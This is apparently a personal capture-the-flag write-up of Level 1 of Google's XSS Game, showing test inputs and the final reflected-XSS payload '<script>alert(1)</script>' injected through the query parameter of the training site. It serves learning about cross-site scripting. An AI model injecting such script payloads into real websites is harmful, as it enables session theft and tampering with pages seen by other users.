# Google XSS Game â€“ Level 1: Reflected XSS

---

## ðŸŽ¯ Mission Description  
This level demonstrates a common cause of cross-site scripting, where user input is directly included in the page without proper escaping.  
You're allowed to interact with the vulnerable frame or modify the URL directly to execute JavaScript.

---

## ðŸŽ¯ Mission Objective  
Inject a script that pops up `alert(1)` in the frame below.  
Once the alert appears, the level is considered solved.

---

## ðŸ§ª Steps (My Try)

### âœ… Tried:  
`x`  
â†’ URL:  
```
https://xss-game.appspot.com/level1/frame?query=x
```  
â†’ Reflected as:  
```html
<b>x</b>
```

---

### âœ… Tried:  
`X">x`  
â†’ URL:  
```
https://xss-game.appspot.com/level1/frame?query=X">x
```  
â†’ Reflected as:  
```html
<b>X">x</b>
```  
ðŸ”¸ This shows we can break out of the attribute or tag.

---

### âœ… Final Payload:  
```html
<script>alert(1)</script>
```

â†’ URL:  
```
https://xss-game.appspot.com/level1/frame?query=<script>alert(1)</script>
```  
ðŸŽ‰ Alert triggered â€” mission accomplished.

---

## ðŸ§  Notes  
- Input is reflected inside a `<b>` tag using `innerHTML`
- No escaping or filtering at all
- Classic Reflected XSS vulnerability
- Direct injection with `<script>` tag works

---

## âœ… Status: Solved ðŸŽ‰
